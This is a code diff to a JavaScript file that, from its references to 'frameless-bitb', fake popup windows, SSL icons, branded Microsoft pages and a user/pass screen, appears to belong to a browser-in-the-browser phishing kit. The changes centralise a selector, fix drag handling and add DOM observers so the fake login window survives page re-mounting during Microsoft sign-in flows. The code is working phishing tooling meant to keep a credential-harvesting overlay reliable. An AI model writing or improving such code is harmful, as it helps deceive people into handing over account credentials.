@@ -5,7 +5,7 @@ const SUFFIX = "END";
 
 const obfEnd = 'OBFS==Qaz12aEND';
 
-
+const targetElementSelector = '.win-scroll'; 
 
 // Sizing constants
 // Not efficient, but works.
@@ -39,11 +39,11 @@ function setInitialSize() {
     $("#pop-background-container").css("left", popLeft);
     $("#pop-background-container").css("transform", popTransform);
 
-    $(".win-scroll").css("width", popWidth);
-    $(".win-scroll").css("height", originalContentHeight);
-    $(".win-scroll").css("top", popTop);
-    $(".win-scroll").css("left", popLeft);
-    $(".win-scroll").css("transform", popContentTransform);
+    $(targetElementSelector).css("width", popWidth);
+    $(targetElementSelector).css("height", originalContentHeight);
+    $(targetElementSelector).css("top", popTop);
+    $(targetElementSelector).css("left", popLeft);
+    $(targetElementSelector).css("transform", popContentTransform);
 }
 
 
@@ -66,8 +66,8 @@ function openTop() {
 function openIn(){
         let checkExist = setInterval(function() {
       
-        if ($('.win-scroll').length) {
-                $(".win-scroll").css('display', "block");
+        if ($(targetElementSelector).length) {
+                $(targetElementSelector).css('display', "block");
 
                 applyPositioning();
 
@@ -79,7 +79,7 @@ function openIn(){
                      clearInterval(recheckInterval);
                      return;
                  }
-                $(".win-scroll").css('display', "block");
+                $(targetElementSelector).css('display', "block");
 
                 applyPositioning();
               }, 50);  // recheck every 50 milliseconds
@@ -121,16 +121,16 @@ function deObfData() {
 function handleDnDLogic() {
     //////////////// Make window draggable ////////////////
     let draggable = $('#pop-window');
-    let winScroll = $('.win-scroll');
+    let winScroll = $(targetElementSelector);
     let title = $('#pop-title-bar');
 
     title.on('mousedown', function(e) {
 
-        if (!e.target.id.indexOf('pop-control') !== -1) {
-        
+        if (e.target.id.indexOf('pop-control') === -1) {
+
         let dr = $(draggable).addClass("drag");
         let db = $('#pop-background-container');
-        let dt = $('.win-scroll').addClass("drag");
+        let dt = $(targetElementSelector).addClass("drag");
         
 
         let initialDiffX = dt.offset().left - dr.offset().left;
@@ -158,7 +158,7 @@ function handleDnDLogic() {
             let draggable = $('#pop-window');
 
             let dr = $(draggable);
-            let dt = $('.win-scroll');
+            let dt = $(targetElementSelector);
 
             if (dr.hasClass("drag")){
                 dr.removeClass("drag");
@@ -200,7 +200,7 @@ function applyPositioning() {
 
     if(storedBtbPosition !== null && storedWinScrollOffset !== null) {
 
-        console.log("storedBtbPosition: ", storedBtbPosition)
+        // console.log("storedBtbPosition: ", storedBtbPosition)
 
 
         let btbPosition = JSON.parse(storedBtbPosition);
@@ -226,7 +226,7 @@ function applyPositioning() {
            top: btbPosition.top,
             left: btbPosition.left
       });
-        $(".win-scroll").offset({
+        $(targetElementSelector).offset({
             top: winScrollTop,
             left: winScrollLeft
         });
@@ -242,7 +242,12 @@ function applyPositioning() {
 function closePopup(){
     $("#pop-window").css("display", "none");
     $("#pop-background-container").css("display", "none");
-    $(".win-scroll").css("display", "none");
+
+
+    $(targetElementSelector).css("display", "none");
+    $(targetElementSelector).classList = "win-scroll closed";
+
+
     $("#pop-ssl").removeClass("visible");
     $("#pop-ssl-icon").removeClass("visible");
     localStorage.setItem('bb-open', false);
@@ -292,7 +297,7 @@ function enlarge(){
     }
   
     let dr = $("#pop-window");
-    let dt = $(".win-scroll");
+    let dt = $(targetElementSelector);
     
     let btbPosition = {
         top: dr.offset().top,
@@ -404,6 +409,85 @@ function handleIsOpenedState (shadowRoot) {
 }
 
 
+// fix for JS-based re-mounting and class changes of target elements (seen in branded Microsoft pages)
+// also check for silent state/navigation changes that might cause similar behavior
+// reference: https://github.com/waelmas/frameless-bitb/issues/4
+function startObserving(targetSelector) {
+    let targetElement = document.querySelector(targetSelector);
+    const observerConfig = { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] };
+    
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+
+        if (mutation.type === 'attributes' && targetElement.classList.contains('closed')) {
+            return; // ignore mutation due to control-btns
+        }
+        // check if the mutation is due to D&D by checking the 'drag' class and ignore style changes
+        if (mutation.type === 'attributes' && targetElement.classList.contains('drag')) {
+            // sleep for a short duration to allow the D&D to complete
+            setTimeout(() => {}, 50);
+            return; // ignore mutation due to D&D
+        }
+        if (mutation.type === 'childList') {
+          mutation.addedNodes.forEach((node) => {
+            if (node === targetElement || node.contains(targetElement)) {
+              handleIsOpenedState();
+            }
+          });
+          mutation.removedNodes.forEach((node) => {
+            if (node === targetElement || node.contains(targetElement)) {
+              // target element removed, attempt to find and observe it again
+              waitForElement(targetSelector);
+            }
+          });
+        }
+        else if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+            handleIsOpenedState();
+        }
+      });
+    });
+  
+    const observe = () => {
+      const bodyObserver = new MutationObserver(() => {
+        const newTargetElement = document.querySelector(targetSelector);
+        if (newTargetElement && newTargetElement !== targetElement) {
+          targetElement = newTargetElement; // update the target element reference
+          observer.observe(targetElement.parentElement, observerConfig);
+          observer.observe(targetElement, observerConfig);
+          // keep observing, otherwise then the user moves back and forth between the user/pass screen
+          // the target element will not be observed again, resulting in the white screen issue again
+        }
+      });
+  
+      // start observing the document body for re-mounting of the target element
+      bodyObserver.observe(document.body, { childList: true, subtree: true });
+      // observe the initial target and its parent, if available
+      if (targetElement) {
+        observer.observe(targetElement.parentElement, observerConfig);
+        observer.observe(targetElement, observerConfig);
+      }
+    };
+  
+    observe();
+  }
+  
+  function waitForElement(selector) {
+    const interval = setInterval(() => {
+      const element = document.querySelector(selector);
+      if (element) {
+        console.log('Target element found, starting observers.');
+        startObserving(selector);
+        clearInterval(interval);
+      }
+    }, 100); // check every 100 milliseconds till found
+  }
+
+  
+
+
+
+
+
 function hadleDOMContentLoaded() {    
 
     // inject the primary page, then initialize it
@@ -438,11 +522,17 @@ function hadleDOMContentLoaded() {
 
     handleDnDLogic();
 
+    // start observing the target element (to apply observers for re-mounting and class changes)
+    waitForElement(targetElementSelector);
+
 }
+
+
 
 document.addEventListener('DOMContentLoaded', hadleDOMContentLoaded);
 
 document.addEventListener('secondaryFlowStart', handleSecondaryFlowStart)
+
 
 
 
